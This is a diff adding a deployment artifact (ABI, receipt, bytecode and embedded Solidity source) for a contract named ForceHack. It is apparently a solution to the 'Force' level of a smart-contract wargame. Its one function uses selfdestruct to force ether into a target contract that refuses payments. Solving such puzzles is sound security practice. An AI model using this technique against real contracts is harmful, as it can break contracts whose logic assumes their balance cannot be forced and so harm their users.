@@ -1,0 +1,54 @@
+{
+  "address": "0xF1aA5556Bcd9f85295F3De5af0e56f896BD2B553",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address payable",
+          "name": "_forceAddress",
+          "type": "address"
+        }
+      ],
+      "name": "sendToForce",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0xe2d1f15315864dde21bf374c9d4b9bce6d1bac704aad18a9561c840909abda01",
+  "receipt": {
+    "to": null,
+    "from": "0x3d772032687fEd06350b1DD7457737Cc4cDb5E2f",
+    "contractAddress": "0xF1aA5556Bcd9f85295F3De5af0e56f896BD2B553",
+    "transactionIndex": 0,
+    "gasUsed": "111301",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+    "blockHash": "0x62f6c98aaa1f1811bd9cb0d62b3fcac07c6e0df801a8b59fa210bdd6f49e53f2",
+    "transactionHash": "0xe2d1f15315864dde21bf374c9d4b9bce6d1bac704aad18a9561c840909abda01",
+    "logs": [],
+    "blockNumber": 10820007,
+    "cumulativeGasUsed": "111301",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [],
+  "numDeployments": 2,
+  "solcInputHash": "cdcd642d3f230bd4e58e1c896b00a9bc",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_forceAddress\",\"type\":\"address\"}],\"name\":\"sendToForce\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/7_force/forceHack.sol\":\"ForceHack\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/7_force/forceHack.sol\":{\"content\":\"// SPDX-License-Identifier: MIT LICENSE\\n\\npragma solidity 0.8.7;\\ncontract ForceHack {\\n    function sendToForce(address payable _forceAddress) public payable {\\n        selfdestruct(_forceAddress);\\n    }\\n}\",\"keccak256\":\"0x6860240bc01c04ae61c59cd9420b5a2a6bee87d29f9c7007339dd5bce9c1f2bb\",\"license\":\"MIT LICENSE\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5061010c806100206000396000f3fe608060405260043610601c5760003560e01c806316a03815146021575b600080fd5b60376004803603810190603391906065565b6039565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff5b600081359050605f8160c2565b92915050565b600060208284031215607857607760bd565b5b60006084848285016052565b91505092915050565b6000609682609d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b60c981608d565b811460d357600080fd5b5056fea26469706673582212202043c5232cda31e9de010dfe35d9d990b8c4c0f25329fe14a7bec454a2e77ade64736f6c63430008070033",
+  "deployedBytecode": "0x608060405260043610601c5760003560e01c806316a03815146021575b600080fd5b60376004803603810190603391906065565b6039565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff5b600081359050605f8160c2565b92915050565b600060208284031215607857607760bd565b5b60006084848285016052565b91505092915050565b6000609682609d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b60c981608d565b811460d357600080fd5b5056fea26469706673582212202043c5232cda31e9de010dfe35d9d990b8c4c0f25329fe14a7bec454a2e77ade64736f6c63430008070033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [],
+    "types": null
+  }
+}
